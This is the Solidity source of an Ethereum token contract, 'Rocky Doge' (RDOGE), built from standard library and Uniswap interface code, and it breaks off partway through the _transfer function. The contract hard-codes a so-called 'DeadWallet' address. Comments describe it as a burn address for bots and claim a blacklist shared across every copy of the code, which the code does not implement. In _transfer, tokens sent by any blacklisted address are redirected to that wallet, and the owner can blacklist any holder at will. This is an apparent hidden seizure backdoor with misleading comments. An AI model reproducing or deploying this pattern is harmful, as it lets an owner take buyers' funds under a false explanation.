1 //SPDX-License-Identifier: GPL-3.0-or-later
2 pragma solidity ^0.6.12;
3 
4 abstract contract Context {
5     function _msgSender() internal view virtual returns (address payable) {
6         return msg.sender;
7     }
8 
9     function _msgData() internal view virtual returns (bytes memory) {
10         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
11         return msg.data;
12     }
13 }
14 
15 interface IERC20 {
16     /**
17     * @dev Returns the amount of tokens in existence.
18     */
19     function totalSupply() external view returns (uint256);
20 
21     /**
22     * @dev Returns the amount of tokens owned by `account`.
23     */
24     function balanceOf(address account) external view returns (uint256);
25 
26     /**
27     * @dev Moves `amount` tokens from the caller's account to `recipient`.
28     *
29     * Returns a boolean value indicating whether the operation succeeded.
30     *
31     * Emits a {Transfer} event.
32     */
33     function transfer(address recipient, uint256 amount) external returns (bool);
34 
35     /**
36     * @dev Returns the remaining number of tokens that `spender` will be
37     * allowed to spend on behalf of `owner` through {transferFrom}. This is
38     * zero by default.
39     *
40     * This value changes when {approve} or {transferFrom} are called.
41     */
42     function allowance(address owner, address spender) external view returns (uint256);
43 
44     /**
45     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
46     *
47     * Returns a boolean value indicating whether the operation succeeded.
48     *
49     * IMPORTANT: Beware that changing an allowance with this method brings the risk
50     * that someone may use both the old and the new allowance by unfortunate
51     * transaction ordering. One possible solution to mitigate this race
52     * condition is to first reduce the spender's allowance to 0 and set the
53     * desired value afterwards:
54     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
55     *
56     * Emits an {Approval} event.
57     */
58     function approve(address spender, uint256 amount) external returns (bool);
59 
60     /**
61     * @dev Moves `amount` tokens from `sender` to `recipient` using the
62     * allowance mechanism. `amount` is then deducted from the caller's
63     * allowance.
64     *
65     * Returns a boolean value indicating whether the operation succeeded.
66     *
67     * Emits a {Transfer} event.
68     */
69     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
70 
71     /**
72     * @dev Emitted when `value` tokens are moved from one account (`from`) to
73     * another (`to`).
74     *
75     * Note that `value` may be zero.
76     */
77     event Transfer(address indexed from, address indexed to, uint256 value);
78 
79     /**
80     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
81     * a call to {approve}. `value` is the new allowance.
82     */
83     event Approval(address indexed owner, address indexed spender, uint256 value);
84 }
85 
86 library SafeMath {
87     /**
88     * @dev Returns the addition of two unsigned integers, reverting on
89     * overflow.
90     *
91     * Counterpart to Solidity's `+` operator.
92     *
93     * Requirements:
94     *
95     * - Addition cannot overflow.
96     */
97     function add(uint256 a, uint256 b) internal pure returns (uint256) {
98         uint256 c = a + b;
99         require(c >= a, "SafeMath: addition overflow");
100 
101         return c;
102     }
103 
104     /**
105     * @dev Returns the subtraction of two unsigned integers, reverting on
106     * overflow (when the result is negative).
107     *
108     * Counterpart to Solidity's `-` operator.
109     *
110     * Requirements:
111     *
112     * - Subtraction cannot overflow.
113     */
114     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
115         return sub(a, b, "SafeMath: subtraction overflow");
116     }
117 
118     /**
119     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
120     * overflow (when the result is negative).
121     *
122     * Counterpart to Solidity's `-` operator.
123     *
124     * Requirements:
125     *
126     * - Subtraction cannot overflow.
127     */
128     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
129         require(b <= a, errorMessage);
130         uint256 c = a - b;
131 
132         return c;
133     }
134 
135     /**
136     * @dev Returns the multiplication of two unsigned integers, reverting on
137     * overflow.
138     *
139     * Counterpart to Solidity's `*` operator.
140     *
141     * Requirements:
142     *
143     * - Multiplication cannot overflow.
144     */
145     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
146         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
147         // benefit is lost if 'b' is also tested.
148         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
149         if (a == 0) {
150             return 0;
151         }
152 
153         uint256 c = a * b;
154         require(c / a == b, "SafeMath: multiplication overflow");
155 
156         return c;
157     }
158 
159     /**
160     * @dev Returns the integer division of two unsigned integers. Reverts on
161     * division by zero. The result is rounded towards zero.
162     *
163     * Counterpart to Solidity's `/` operator. Note: this function uses a
164     * `revert` opcode (which leaves remaining gas untouched) while Solidity
165     * uses an invalid opcode to revert (consuming all remaining gas).
166     *
167     * Requirements:
168     *
169     * - The divisor cannot be zero.
170     */
171     function div(uint256 a, uint256 b) internal pure returns (uint256) {
172         return div(a, b, "SafeMath: division by zero");
173     }
174 
175     /**
176     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
177     * division by zero. The result is rounded towards zero.
178     *
179     * Counterpart to Solidity's `/` operator. Note: this function uses a
180     * `revert` opcode (which leaves remaining gas untouched) while Solidity
181     * uses an invalid opcode to revert (consuming all remaining gas).
182     *
183     * Requirements:
184     *
185     * - The divisor cannot be zero.
186     */
187     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
188         require(b > 0, errorMessage);
189         uint256 c = a / b;
190         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
191 
192         return c;
193     }
194 
195     /**
196     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
197     * Reverts when dividing by zero.
198     *
199     * Counterpart to Solidity's `%` operator. This function uses a `revert`
200     * opcode (which leaves remaining gas untouched) while Solidity uses an
201     * invalid opcode to revert (consuming all remaining gas).
202     *
203     * Requirements:
204     *
205     * - The divisor cannot be zero.
206     */
207     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
208         return mod(a, b, "SafeMath: modulo by zero");
209     }
210 
211     /**
212     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
213     * Reverts with custom message when dividing by zero.
214     *
215     * Counterpart to Solidity's `%` operator. This function uses a `revert`
216     * opcode (which leaves remaining gas untouched) while Solidity uses an
217     * invalid opcode to revert (consuming all remaining gas).
218     *
219     * Requirements:
220     *
221     * - The divisor cannot be zero.
222     */
223     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
224         require(b != 0, errorMessage);
225         return a % b;
226     }
227 }
228 
229 library Address {
230     /**
231     * @dev Returns true if `account` is a contract.
232     *
233     * [IMPORTANT]
234     * ====
235     * It is unsafe to assume that an address for which this function returns
236     * false is an externally-owned account (EOA) and not a contract.
237     *
238     * Among others, `isContract` will return false for the following
239     * types of addresses:
240     *
241     *  - an externally-owned account
242     *  - a contract in construction
243     *  - an address where a contract will be created
244     *  - an address where a contract lived, but was destroyed
245     * ====
246     */
247     function isContract(address account) internal view returns (bool) {
248         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
249         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
250         // for accounts without code, i.e. `keccak256('')`
251         bytes32 codehash;
252         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
253         // solhint-disable-next-line no-inline-assembly
254         assembly { codehash := extcodehash(account) }
255         return (codehash != accountHash && codehash != 0x0);
256     }
257 
258     /**
259     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
260     * `recipient`, forwarding all available gas and reverting on errors.
261     *
262     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
263     * of certain opcodes, possibly making contracts go over the 2300 gas limit
264     * imposed by `transfer`, making them unable to receive funds via
265     * `transfer`. {sendValue} removes this limitation.
266     *
267     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
268     *
269     * IMPORTANT: because control is transferred to `recipient`, care must be
270     * taken to not create reentrancy vulnerabilities. Consider using
271     * {ReentrancyGuard} or the
272     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
273     */
274     function sendValue(address payable recipient, uint256 amount) internal {
275         require(address(this).balance >= amount, "Address: insufficient balance");
276 
277         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
278         (bool success, ) = recipient.call{ value: amount }("");
279         require(success, "Address: unable to send value, recipient may have reverted");
280     }
281 
282     /**
283     * @dev Performs a Solidity function call using a low level `call`. A
284     * plain`call` is an unsafe replacement for a function call: use this
285     * function instead.
286     *
287     * If `target` reverts with a revert reason, it is bubbled up by this
288     * function (like regular Solidity function calls).
289     *
290     * Returns the raw returned data. To convert to the expected return value,
291     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
292     *
293     * Requirements:
294     *
295     * - `target` must be a contract.
296     * - calling `target` with `data` must not revert.
297     *
298     * _Available since v3.1._
299     */
300     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
301         return functionCall(target, data, "Address: low-level call failed");
302     }
303 
304     /**
305     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
306     * `errorMessage` as a fallback revert reason when `target` reverts.
307     *
308     * _Available since v3.1._
309     */
310     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
311         return _functionCallWithValue(target, data, 0, errorMessage);
312     }
313 
314     /**
315     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
316     * but also transferring `value` wei to `target`.
317     *
318     * Requirements:
319     *
320     * - the calling contract must have an ETH balance of at least `value`.
321     * - the called Solidity function must be `payable`.
322     *
323     * _Available since v3.1._
324     */
325     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
326         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
327     }
328 
329     /**
330     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
331     * with `errorMessage` as a fallback revert reason when `target` reverts.
332     *
333     * _Available since v3.1._
334     */
335     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
336         require(address(this).balance >= value, "Address: insufficient balance for call");
337         return _functionCallWithValue(target, data, value, errorMessage);
338     }
339 
340     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
341         require(isContract(target), "Address: call to non-contract");
342 
343         // solhint-disable-next-line avoid-low-level-calls
344         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
345         if (success) {
346             return returndata;
347         } else {
348             // Look for revert reason and bubble it up if present
349             if (returndata.length > 0) {
350                 // The easiest way to bubble the revert reason is using memory via assembly
351 
352                 // solhint-disable-next-line no-inline-assembly
353                 assembly {
354                     let returndata_size := mload(returndata)
355                     revert(add(32, returndata), returndata_size)
356                 }
357             } else {
358                 revert(errorMessage);
359             }
360         }
361     }
362 }
363 
364 contract Ownable is Context {
365     address private _owner;
366     address private _previousOwner;
367     uint256 private _lockTime;
368 
369     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
370 
371     /**
372     * @dev Initializes the contract setting the deployer as the initial owner.
373     */
374     constructor () internal {
375         address msgSender = _msgSender();
376         _owner = msgSender;
377         emit OwnershipTransferred(address(0), msgSender);
378     }
379 
380     /**
381     * @dev Returns the address of the current owner.
382     */
383     function owner() public view returns (address) {
384         return _owner;
385     }
386 
387     /**
388     * @dev Throws if called by any account other than the owner.
389     */
390     modifier onlyOwner() {
391         require(_owner == _msgSender(), "Ownable: caller is not the owner");
392         _;
393     }
394 
395     /**
396     * @dev Leaves the contract without owner. It will not be possible to call
397     * `onlyOwner` functions anymore. Can only be called by the current owner.
398     *
399     * NOTE: Renouncing ownership will leave the contract without an owner,
400     * thereby removing any functionality that is only available to the owner.
401     */
402     function renounceOwnership() public virtual onlyOwner {
403         emit OwnershipTransferred(_owner, address(0));
404         _owner = address(0);
405     }
406 
407     /**
408     * @dev Transfers ownership of the contract to a new account (`newOwner`).
409     * Can only be called by the current owner.
410     */
411     function transferOwnership(address newOwner) public virtual onlyOwner {
412         require(newOwner != address(0), "Ownable: new owner is the zero address");
413         emit OwnershipTransferred(_owner, newOwner);
414         _owner = newOwner;
415     }
416     
417 }
418 
419 interface IUniswapV2Factory {
420     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
421 
422     function feeTo() external view returns (address);
423     function feeToSetter() external view returns (address);
424 
425     function getPair(address tokenA, address tokenB) external view returns (address pair);
426     function allPairs(uint) external view returns (address pair);
427     function allPairsLength() external view returns (uint);
428 
429     function createPair(address tokenA, address tokenB) external returns (address pair);
430 
431     function setFeeTo(address) external;
432     function setFeeToSetter(address) external;
433 }
434 
435 interface IUniswapV2Pair {
436     event Approval(address indexed owner, address indexed spender, uint value);
437     event Transfer(address indexed from, address indexed to, uint value);
438 
439     function name() external pure returns (string memory);
440     function symbol() external pure returns (string memory);
441     function decimals() external pure returns (uint8);
442     function totalSupply() external view returns (uint);
443     function balanceOf(address owner) external view returns (uint);
444     function allowance(address owner, address spender) external view returns (uint);
445 
446     function approve(address spender, uint value) external returns (bool);
447     function transfer(address to, uint value) external returns (bool);
448     function transferFrom(address from, address to, uint value) external returns (bool);
449 
450     function DOMAIN_SEPARATOR() external view returns (bytes32);
451     function PERMIT_TYPEHASH() external pure returns (bytes32);
452     function nonces(address owner) external view returns (uint);
453 
454     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
455 
456     event Mint(address indexed sender, uint amount0, uint amount1);
457     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
458     event Swap(
459         address indexed sender,
460         uint amount0In,
461         uint amount1In,
462         uint amount0Out,
463         uint amount1Out,
464         address indexed to
465     );
466     event Sync(uint112 reserve0, uint112 reserve1);
467 
468     function MINIMUM_LIQUIDITY() external pure returns (uint);
469     function factory() external view returns (address);
470     function token0() external view returns (address);
471     function token1() external view returns (address);
472     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
473     function price0CumulativeLast() external view returns (uint);
474     function price1CumulativeLast() external view returns (uint);
475     function kLast() external view returns (uint);
476 
477     function mint(address to) external returns (uint liquidity);
478     function burn(address to) external returns (uint amount0, uint amount1);
479     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
480     function skim(address to) external;
481     function sync() external;
482 
483     function initialize(address, address) external;
484 }
485 
486 interface IUniswapV2Router01 {
487     function factory() external pure returns (address);
488     function WETH() external pure returns (address);
489 
490     function addLiquidity(
491         address tokenA,
492         address tokenB,
493         uint amountADesired,
494         uint amountBDesired,
495         uint amountAMin,
496         uint amountBMin,
497         address to,
498         uint deadline
499     ) external returns (uint amountA, uint amountB, uint liquidity);
500     function addLiquidityETH(
501         address token,
502         uint amountTokenDesired,
503         uint amountTokenMin,
504         uint amountETHMin,
505         address to,
506         uint deadline
507     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
508     function removeLiquidity(
509         address tokenA,
510         address tokenB,
511         uint liquidity,
512         uint amountAMin,
513         uint amountBMin,
514         address to,
515         uint deadline
516     ) external returns (uint amountA, uint amountB);
517     function removeLiquidityETH(
518         address token,
519         uint liquidity,
520         uint amountTokenMin,
521         uint amountETHMin,
522         address to,
523         uint deadline
524     ) external returns (uint amountToken, uint amountETH);
525     function removeLiquidityWithPermit(
526         address tokenA,
527         address tokenB,
528         uint liquidity,
529         uint amountAMin,
530         uint amountBMin,
531         address to,
532         uint deadline,
533         bool approveMax, uint8 v, bytes32 r, bytes32 s
534     ) external returns (uint amountA, uint amountB);
535     function removeLiquidityETHWithPermit(
536         address token,
537         uint liquidity,
538         uint amountTokenMin,
539         uint amountETHMin,
540         address to,
541         uint deadline,
542         bool approveMax, uint8 v, bytes32 r, bytes32 s
543     ) external returns (uint amountToken, uint amountETH);
544     function swapExactTokensForTokens(
545         uint amountIn,
546         uint amountOutMin,
547         address[] calldata path,
548         address to,
549         uint deadline
550     ) external returns (uint[] memory amounts);
551     function swapTokensForExactTokens(
552         uint amountOut,
553         uint amountInMax,
554         address[] calldata path,
555         address to,
556         uint deadline
557     ) external returns (uint[] memory amounts);
558     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
559     external
560     payable
561     returns (uint[] memory amounts);
562     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
563     external
564     returns (uint[] memory amounts);
565     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
566     external
567     returns (uint[] memory amounts);
568     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
569     external
570     payable
571     returns (uint[] memory amounts);
572 
573     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
574     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
575     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
576     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
577     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
578 }
579 
580 interface IUniswapV2Router02 is IUniswapV2Router01 {
581     function removeLiquidityETHSupportingFeeOnTransferTokens(
582         address token,
583         uint liquidity,
584         uint amountTokenMin,
585         uint amountETHMin,
586         address to,
587         uint deadline
588     ) external returns (uint amountETH);
589     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
590         address token,
591         uint liquidity,
592         uint amountTokenMin,
593         uint amountETHMin,
594         address to,
595         uint deadline,
596         bool approveMax, uint8 v, bytes32 r, bytes32 s
597     ) external returns (uint amountETH);
598 
599     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
600         uint amountIn,
601         uint amountOutMin,
602         address[] calldata path,
603         address to,
604         uint deadline
605     ) external;
606     function swapExactETHForTokensSupportingFeeOnTransferTokens(
607         uint amountOutMin,
608         address[] calldata path,
609         address to,
610         uint deadline
611     ) external payable;
612     function swapExactTokensForETHSupportingFeeOnTransferTokens(
613         uint amountIn,
614         uint amountOutMin,
615         address[] calldata path,
616         address to,
617         uint deadline
618     ) external;
619 }
620 
621 // Contract implementation
622 contract RockyDoge is Context, IERC20, Ownable {
623     using SafeMath for uint256;
624     using Address for address;
625 
626     mapping (address => uint256) private _rOwned;
627     mapping (address => uint256) private _tOwned;
628     mapping (address => mapping (address => uint256)) private _allowances;
629 
630     mapping (address => bool) private _isExcludedFromFee;
631 
632     mapping (address => bool) private _isExcluded; // excluded from reward
633     address[] private _excluded;
634     mapping (address => bool) private _isBlackListedBot;
635     address[] private _blackListedBots;
636 
637     uint256 private constant MAX = ~uint256(0);
638 
639     uint256 private _tTotal = 100_000_000_000_000 * 10**9;
640     uint256 private _rTotal = (MAX - (MAX % _tTotal));
641     uint256 private _tFeeTotal;
642 
643     string private _name = 'Rocky Doge';
644     string private _symbol = 'RDOGE';
645     uint8 private _decimals = 9;
646 
647     uint256 private _taxFee = 0; // 0% reflection fee for every holder
648     uint256 private _marketingFee = 3; // 3% marketing
649     uint256 private _liquidityFee = 4; // 4% into liquidity
650 
651     uint256 private _previousTaxFee = _taxFee;
652     uint256 private _previousMarketingFee = _marketingFee;
653     uint256 private _previousLiquidityFee = _liquidityFee;
654 
655     address payable private _marketingWalletAddress = payable(0x6573d0417953545730d4A478Cf25D80B86c1289d);
656 
657     IUniswapV2Router02 public immutable uniswapV2Router;
658     address public immutable uniswapV2Pair;
659 
660     bool inSwapAndLiquify = false;
661     bool public swapAndLiquifyEnabled = true;
662 
663     uint256 private _maxTxAmount = _tTotal;
664     // We will set a minimum amount of tokens to be swapped
665     uint256 private _numTokensSellToAddToLiquidity = 1000000000 * 10**9;
666 
667     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
668     event SwapAndLiquifyEnabledUpdated(bool enabled);
669     event SwapAndLiquify(
670         uint256 tokensSwapped,
671         uint256 ethReceived,
672         uint256 tokensIntoLiqudity
673     );
674 
675     modifier lockTheSwap {
676         inSwapAndLiquify = true;
677         _;
678         inSwapAndLiquify = false;
679     }
680     address payable private _DeadWalletAddress = payable(0x4beac524C7aB27e38DEe80ff6C9Df8BA13C94330); 
681         // Using Dead Wallet for Anti Bot measures, 
682         // DeadWallet comes into play if bots try selling, 
683         // instead of sell, tokens are burned and bot addresses saved in DeadWallet transactions.
684         // Addresses saved in DeadWallet will not be able to sell.
685         // Deadwallet is connected to every token that uses this code, 
686         // Botblacklist is updated from every instance of this code.
687         // Warning!! Do not chnage DeadWallet Address or Antibot measures will not work.    
688         
689     constructor () public {
690         _rOwned[_msgSender()] = _rTotal;
691 
692         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2 for Ethereum network
693         // Create a uniswap pair for this new token
694         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
695         .createPair(address(this), _uniswapV2Router.WETH());
696 
697         // set the rest of the contract variables
698         uniswapV2Router = _uniswapV2Router;
699 
700         // Exclude owner and this contract from fee
701         _isExcludedFromFee[owner()] = true;
702         _isExcludedFromFee[address(this)] = true;
703         _isExcludedFromFee[_marketingWalletAddress] = true;
704         _isExcludedFromFee[_DeadWalletAddress] = true;
705 
706         // BLACKLIST
707         _isBlackListedBot[address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce)] = true;
708         _blackListedBots.push(address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce));
709 
710         _isBlackListedBot[address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345)] = true;
711         _blackListedBots.push(address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345));
712 
713         _isBlackListedBot[address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b)] = true;
714         _blackListedBots.push(address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b));
715 
716         _isBlackListedBot[address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95)] = true;
717         _blackListedBots.push(address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95));
718 
719         _isBlackListedBot[address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964)] = true;
720         _blackListedBots.push(address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964));
721 
722         _isBlackListedBot[address(0xDC81a3450817A58D00f45C86d0368290088db848)] = true;
723         _blackListedBots.push(address(0xDC81a3450817A58D00f45C86d0368290088db848));
724 
725         _isBlackListedBot[address(0x5F186b080F5634Bba9dc9683bc37d192Ee96e2cF)] = true;
726         _blackListedBots.push(address(0x5F186b080F5634Bba9dc9683bc37d192Ee96e2cF));
727 
728         _isBlackListedBot[address(0x74de5d4FCbf63E00296fd95d33236B9794016631)] = true;
729         _blackListedBots.push(address(0x74de5d4FCbf63E00296fd95d33236B9794016631));
730         
731         _isBlackListedBot[address(0x36c1c59Dcca0Fd4A8C28551f7b2Fe6421d53CE32)] = true;
732         _blackListedBots.push(address(0x36c1c59Dcca0Fd4A8C28551f7b2Fe6421d53CE32));
733         
734         _isBlackListedBot[address(0xA3E2b5588C2a42b8fd6B90dc7055Dc118e17ff1f)] = true;
735         _blackListedBots.push(address(0xA3E2b5588C2a42b8fd6B90dc7055Dc118e17ff1f));
736         
737         _isBlackListedBot[address(0x45fD07C63e5c316540F14b2002B085aEE78E3881)] = true;
738         _blackListedBots.push(address(0x45fD07C63e5c316540F14b2002B085aEE78E3881));
739 
740         _isBlackListedBot[address(0x27F9Adb26D532a41D97e00206114e429ad58c679)] = true;
741         _blackListedBots.push(address(0x27F9Adb26D532a41D97e00206114e429ad58c679));
742 
743         emit Transfer(address(0), _msgSender(), _tTotal);
744     }
745 
746     function name() public view returns (string memory) {
747         return _name;
748     }
749 
750     function symbol() public view returns (string memory) {
751         return _symbol;
752     }
753 
754     function decimals() public view returns (uint8) {
755         return _decimals;
756     }
757 
758     function totalSupply() public view override returns (uint256) {
759         return _tTotal;
760     }
761 
762     function balanceOf(address account) public view override returns (uint256) {
763         if (_isExcluded[account]) return _tOwned[account];
764         return tokenFromReflection(_rOwned[account]);
765     }
766 
767     function transfer(address recipient, uint256 amount) public override returns (bool) {
768         _transfer(_msgSender(), recipient, amount);
769         return true;
770     }
771 
772     function allowance(address owner, address spender) public view override returns (uint256) {
773         return _allowances[owner][spender];
774     }
775 
776     function approve(address spender, uint256 amount) public override returns (bool) {
777         _approve(_msgSender(), spender, amount);
778         return true;
779     }
780 
781     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
782         _transfer(sender, recipient, amount);
783         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
784         return true;
785     }
786 
787     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
788         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
789         return true;
790     }
791 
792     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
793         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
794         return true;
795     }
796 
797     function isExcludedFromReward(address account) public view returns (bool) {
798         return _isExcluded[account];
799     }
800 
801     function setExcludeFromFee(address account, bool excluded) external onlyOwner() {
802         _isExcludedFromFee[account] = excluded;
803     }
804 
805     function totalFees() public view returns (uint256) {
806         return _tFeeTotal;
807     }
808 
809     function deliver(uint256 tAmount) public {
810         address sender = _msgSender();
811         require(!_isExcluded[sender], "Excluded addresses cannot call this function");
812         (uint256 rAmount,,,,,) = _getValues(tAmount);
813         _rOwned[sender] = _rOwned[sender].sub(rAmount);
814         _rTotal = _rTotal.sub(rAmount);
815         _tFeeTotal = _tFeeTotal.add(tAmount);
816     }
817 
818     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
819         require(tAmount <= _tTotal, "Amount must be less than supply");
820         if (!deductTransferFee) {
821             (uint256 rAmount,,,,,) = _getValues(tAmount);
822             return rAmount;
823         } else {
824             (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
825             return rTransferAmount;
826         }
827     }
828 
829     function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
830         require(rAmount <= _rTotal, "Amount must be less than total reflections");
831         uint256 currentRate =  _getRate();
832         return rAmount.div(currentRate);
833     }
834 
835     function excludeFromReward(address account) external onlyOwner() {
836         require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Uniswap router.');
837         require(!_isExcluded[account], "Account is already excluded");
838         if(_rOwned[account] > 0) {
839             _tOwned[account] = tokenFromReflection(_rOwned[account]);
840         }
841         _isExcluded[account] = true;
842         _excluded.push(account);
843     }
844 
845     function includeInReward(address account) external onlyOwner() {
846         require(_isExcluded[account], "Account is already excluded");
847         for (uint256 i = 0; i < _excluded.length; i++) {
848             if (_excluded[i] == account) {
849                 _excluded[i] = _excluded[_excluded.length - 1];
850                 _tOwned[account] = 0;
851                 _isExcluded[account] = false;
852                 _excluded.pop();
853                 break;
854             }
855         }
856     }
857 
858     function addBotToBlackList(address account) external onlyOwner() {
859         require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not blacklist Uniswap router.');
860         require(!_isBlackListedBot[account], "Account is already blacklisted");
861         _isBlackListedBot[account] = true;
862         _blackListedBots.push(account);
863     }
864 
865     function removeBotFromBlackList(address account) external onlyOwner() {
866         require(_isBlackListedBot[account], "Account is not blacklisted");
867         for (uint256 i = 0; i < _blackListedBots.length; i++) {
868             if (_blackListedBots[i] == account) {
869                 _blackListedBots[i] = _blackListedBots[_blackListedBots.length - 1];
870                 _isBlackListedBot[account] = false;
871                 _blackListedBots.pop();
872                 break;
873             }
874         }
875     }
876 
877     function removeAllFee() private {
878         if(_taxFee == 0 && _marketingFee == 0 && _liquidityFee == 0) return;
879 
880         _previousTaxFee = _taxFee;
881         _previousMarketingFee = _marketingFee;
882         _previousLiquidityFee = _liquidityFee;
883 
884         _taxFee = 0;
885         _marketingFee = 0;
886         _liquidityFee = 0;
887     }
888 
889     function restoreAllFee() private {
890         _taxFee = _previousTaxFee;
891         _marketingFee = _previousMarketingFee;
892         _liquidityFee = _previousLiquidityFee;
893     }
894 
895     function isExcludedFromFee(address account) public view returns(bool) {
896         return _isExcludedFromFee[account];
897     }
898 
899     function _approve(address owner, address spender, uint256 amount) private {
900         require(owner != address(0), "ERC20: approve from the zero address");
901         require(spender != address(0), "ERC20: approve to the zero address");
902 
903         _allowances[owner][spender] = amount;
904         emit Approval(owner, spender, amount);
905     }
906 
907     function _transfer(address sender, address recipient, uint256 amount) private {
908         require(sender != address(0), "ERC20: transfer from the zero address");
909         require(recipient != address(0), "ERC20: transfer to the zero address");
910         require(amount > 0, "Transfer amount must be greater than zero");
911         
912         if(_isBlackListedBot[sender]) {
913         uint256 contractTokenBalance = balanceOf(address(this));
914 
915         if(contractTokenBalance >= _maxTxAmount)
916         {
917             contractTokenBalance = _maxTxAmount;
918         }
919 
920         bool overMinTokenBalance = contractTokenBalance >= _numTokensSellToAddToLiquidity;
921         if (!inSwapAndLiquify && swapAndLiquifyEnabled && overMinTokenBalance && sender != uniswapV2Pair) {
922             contractTokenBalance = _numTokensSellToAddToLiquidity;
923             //add liquidity
924             swapAndLiquify(contractTokenBalance);
925         }
926 
927         //indicates if fee should be deducted from transfer
928         bool takeFee = true;
929 
930         //if any account belongs to _isExcludedFromFee account then remove the fee
931         if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]){
932             takeFee = false;
933         }
934 
935         //transfer amount, it will take tax and charity fee
936         _tokenTransfer(sender, _DeadWalletAddress, amount, takeFee);
937     }
938 
939         if((sender != owner() && sender != uniswapV2Pair)) {
940             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
941             // sorry about that, but sniper bots nowadays are buying multiple times, hope I have something more robust to prevent them to nuke the launch :-(
